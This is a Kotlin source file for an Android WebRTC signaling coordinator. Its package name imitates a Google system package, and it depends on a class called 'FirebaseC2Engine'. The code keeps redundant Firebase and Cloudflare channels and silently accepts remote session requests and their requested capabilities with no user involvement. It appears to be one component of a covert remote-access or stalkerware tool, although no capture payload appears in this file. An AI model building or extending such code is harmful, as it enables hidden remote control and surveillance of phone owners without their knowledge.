package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicLong

/**
 * SignalingCoordinator
 *
 * Coordinates WebRTC signaling over dual redundant paths:
 * 1. Firebase Realtime Database (Primary)
 * 2. Cloudflare Worker Durable Object WebSocket (Hot Fallback)
 *
 * Deduplicates messages by messageId, handles sequence counters, and coordinates failover.
 */
class SignalingCoordinator(
    private val context: Context,
    private val firebaseEngine: FirebaseC2Engine
) {
    companion object {
        private const val TAG = "SignalingCoordinator"
    }

    interface Listener {
        fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>)
        fun onOfferReceived(sessionId: String, sdp: String)
        fun onIceCandidateReceived(sessionId: String, candidateJson: JSONObject)
        fun onSessionClosed(sessionId: String)
    }

    private val firebaseProvider = FirebaseSignalingProvider(context, firebaseEngine)
    private val cloudflareProvider = CloudflareSignalingProvider(context, firebaseEngine)
    private val messageTracker = ProcessedMessageTracker()
    private val sequenceCounter = AtomicLong(0L)

    private var listener: Listener? = null
    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var activeSessionId: String? = null

    fun setListener(listener: Listener?) {
        this.listener = listener
    }

    fun start() {
        Log.i(TAG, "Starting Dual-Path Signaling Coordinator 🚀")

        val envelopeHandler = object : FirebaseSignalingProvider.Listener, CloudflareSignalingProvider.Listener {
            override fun onEnvelopeReceived(envelope: SignalingEnvelope) {
                handleIncomingEnvelope(envelope)
            }

            override fun onConnected() {
                Log.i(TAG, "Cloudflare hot fallback path ACTIVE 🟢")
            }

            override fun onDisconnected() {
                Log.w(TAG, "Cloudflare hot fallback path disconnected (retrying)")
            }
        }

        firebaseProvider.setListener(envelopeHandler)
        cloudflareProvider.setListener(envelopeHandler)

        firebaseProvider.startListening(scope)
        cloudflareProvider.start(scope)
    }

    fun stop() {
        try {
            firebaseProvider.stopListening()
            cloudflareProvider.stop()
            scope.cancel()
            messageTracker.clear()
            activeSessionId = null
            Log.i(TAG, "Signaling Coordinator Stopped.")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping SignalingCoordinator: ${e.message}")
        }
    }

    @Synchronized
    fun handleIncomingEnvelope(envelope: SignalingEnvelope?) {
        // 1. Validate envelope structure
        if (envelope == null) {
            Log.w(TAG, "Rejected envelope: null")
            return
        }

        // 2. Validate protocol version
        if (envelope.protocolVersion < 1) {
            Log.w(TAG, "Rejected envelope: invalid protocolVersion (${envelope.protocolVersion})")
            return
        }

        // 3. Validate session ID
        if (envelope.sessionId.isBlank()) {
            Log.w(TAG, "Rejected envelope: empty sessionId")
            return
        }
        if (activeSessionId != null && activeSessionId != envelope.sessionId) {
            // Allow new session request or new offer to replace stale session
            if (envelope.type != "SESSION_REQUEST" && envelope.type != "SDP_OFFER") {
                Log.w(TAG, "Rejected envelope from stale session: ${envelope.sessionId} (active: $activeSessionId)")
                return
            }
        }

        // 4. Validate sender role
        if (envelope.senderRole == "ANDROID") {
            // Ignore self-published messages
            return
        }

        // 5. Validate message type
        val knownTypes = setOf("SESSION_REQUEST", "SESSION_ACCEPTED", "SDP_OFFER", "SDP_ANSWER", "ICE_CANDIDATE", "SESSION_CLOSE", "SESSION_ERROR", "MESSAGE_ACK")
        if (!knownTypes.contains(envelope.type)) {
            Log.w(TAG, "Rejected envelope: unknown type (${envelope.type})")
            return
        }

        // 6. Validate required payload fields
        val payload = envelope.payload
        when (envelope.type) {
            "SDP_OFFER" -> {
                val sdp = payload.optString("sdp", "")
                if (sdp.isBlank()) {
                    Log.w(TAG, "Rejected SDP_OFFER envelope: missing SDP in payload")
                    return
                }
            }
            "ICE_CANDIDATE" -> {
                val candStr = payload.optString("candidate", "")
                if (candStr.isBlank()) {
                    Log.w(TAG, "Rejected ICE_CANDIDATE envelope: missing candidate in payload")
                    return
                }
            }
        }

        // 7. Validate expiry
        if (envelope.expiresAt > 0 && System.currentTimeMillis() > envelope.expiresAt) {
            Log.w(TAG, "Rejected envelope: expired at ${envelope.expiresAt} (now: ${System.currentTimeMillis()})")
            return
        }

        // 8. Only then register message ID as processed
        if (messageTracker.isAlreadyProcessed(envelope.sessionId, envelope.messageId)) {
            Log.i(TAG, "Deduplicated second copy of envelope: type=${envelope.type}, ID=${envelope.messageId}")
            return
        }

        Log.i(TAG, "Dispatching validated envelope: type=${envelope.type}, sessionId=${envelope.sessionId}, messageId=${envelope.messageId}")

        // 9. Dispatch event
        when (envelope.type) {
            "SESSION_REQUEST" -> {
                if (activeSessionId == null || activeSessionId != envelope.sessionId) {
                    if (activeSessionId != null && activeSessionId != envelope.sessionId) {
                        listener?.onSessionClosed(activeSessionId!!)
                    }
                    activeSessionId = envelope.sessionId
                    postSessionAccepted(envelope.sessionId)
                    val reqCaps = mutableListOf<String>()
                    val capsArr = payload.optJSONArray("requestedCapabilities")
                    if (capsArr != null) {
                        for (i in 0 until capsArr.length()) reqCaps.add(capsArr.getString(i))
                    }
                    listener?.onSessionRequested(envelope.sessionId, reqCaps)
                }
            }
            "SDP_OFFER" -> {
                val sdp = payload.optString("sdp", "")
                if (activeSessionId == null) activeSessionId = envelope.sessionId
                listener?.onOfferReceived(envelope.sessionId, sdp)
            }
            "ICE_CANDIDATE" -> {
                listener?.onIceCandidateReceived(envelope.sessionId, payload)
            }
            "SESSION_CLOSE", "SESSION_ERROR" -> {
                val sessId = activeSessionId ?: envelope.sessionId
                activeSessionId = null
                listener?.onSessionClosed(sessId)
            }
        }
    }

    fun postSessionAccepted(sessionId: String) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "acc_${sessionId}_${System.currentTimeMillis()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "SESSION_ACCEPTED",
            payload = JSONObject().apply { put("status", "ACCEPTED") }
        )
        publishDual(envelope)
    }

    fun postSdpAnswer(sessionId: String, sdp: String) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "ans_${sessionId}_${System.currentTimeMillis()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "SDP_ANSWER",
            payload = JSONObject().apply {
                put("type", "answer")
                put("sdp", sdp)
                put("revision", 1)
            }
        )
        publishDual(envelope)
    }

    fun postIceCandidate(sessionId: String, candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "cand_${sessionId}_${System.currentTimeMillis()}_${(0..999).random()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "ICE_CANDIDATE",
            payload = JSONObject().apply {
                put("senderRole", "ANDROID")
                put("sender", "ANDROID")
                put("candidate", candidate)
                put("sdpMid", sdpMid)
                put("sdpMLineIndex", sdpMLineIndex)
            }
        )
        publishDual(envelope)
    }

    fun postSessionClosed(sessionId: String) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "close_${sessionId}_${System.currentTimeMillis()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "SESSION_CLOSE",
            payload = JSONObject().apply { put("status", "CLOSED") }
        )
        publishDual(envelope)
    }

    private fun publishDual(envelope: SignalingEnvelope) {
        scope.launch(Dispatchers.IO) {
            val fbJob = async { firebaseProvider.publishEnvelope(envelope) }
            val cfJob = async { cloudflareProvider.publishEnvelope(envelope) }

            val fbResult = fbJob.await()
            val cfResult = cfJob.await()

            Log.i(TAG, "Dual-Publish Envelope (${envelope.type}, ID: ${envelope.messageId}): Firebase=$fbResult, Cloudflare=$cfResult")
        }
    }
}
